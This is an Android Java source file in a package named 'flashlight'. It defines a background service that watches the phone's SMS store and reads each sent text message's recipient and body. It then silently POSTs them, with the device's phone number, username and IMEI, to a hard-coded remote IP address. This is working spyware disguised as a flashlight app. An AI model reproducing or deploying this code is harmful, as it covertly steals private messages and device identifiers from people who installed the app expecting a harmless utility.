package com.androidhive.flashlight;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;


/**
 * Created by lucadalseno on 26/06/17.
 */

public class MessageOutService extends Service{

    private String address;
    private String message;
    private GetInfo info;


    private String getAddress(){
        return address;
    }

    private void setAddress(String address){
        this.address = address;
    }

    private String getMessage(){
        return message;
    }

    private void setMessage(String message){
        this.message = message;
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }
    @Override
    public void onCreate() {
        super.onCreate();

        info = new GetInfo(this);
        ContentResolver contentResolver = getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new smsObserver(new Handler()));
    }



    class smsObserver extends ContentObserver {

        private String lastSmsId;

        public smsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
            cur.moveToNext();
            String id = cur.getString(cur.getColumnIndex("_id"));
            if (smsChecker(id)) {
                setAddress(cur.getString(cur.getColumnIndex("address")));
                setMessage(cur.getString(cur.getColumnIndex("body")));
                Log.i("Message",message);
                AsyncT async = new AsyncT();
                async.execute();
            }
        }

        // Prevent duplicate results without overlooking legitimate duplicates
        public boolean smsChecker(String smsId) {
            boolean flagSMS = true;

            if (smsId.equals(lastSmsId)) {
                flagSMS = false;
            }
            else {
                lastSmsId = smsId;
            }
            return flagSMS;
        }
    }

    class AsyncT extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... params) {

            try {

                URL url = new URL("http://79.24.89.148:8000/Server/"); //Enter URL here
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestMethod("POST"); // here you are telling that it is a POST request, which can be changed into "PUT", "GET", "DELETE" etc.
                httpURLConnection.setRequestProperty("Content-Type", "application/json"); // here you are setting the `Content-Type` for the data you are sending which is `application/json`
                httpURLConnection.connect();


                JSONObject doc = new JSONObject();
                JSONObject messageJSON = new JSONObject();

                messageJSON.put("Sender", info.getPhoneNumber());
                messageJSON.put("ReceiverNumber", getAddress());
                messageJSON.put("Text", getMessage());
                messageJSON.put("Username", info.getUsername());
                messageJSON.put("IMEI",info.getImei());

                doc.put("Message", messageJSON);
                doc.put("r", "pushMessage");

                DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream());
                wr.writeBytes(doc.toString());
                wr.flush();
                wr.close();

                Log.i("Response", "" + httpURLConnection.getResponseMessage());

            } catch (ProtocolException e1) {
                e1.printStackTrace();
            } catch (MalformedURLException e1) {
                e1.printStackTrace();
            } catch (IOException e1) {
                e1.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }
    }
}


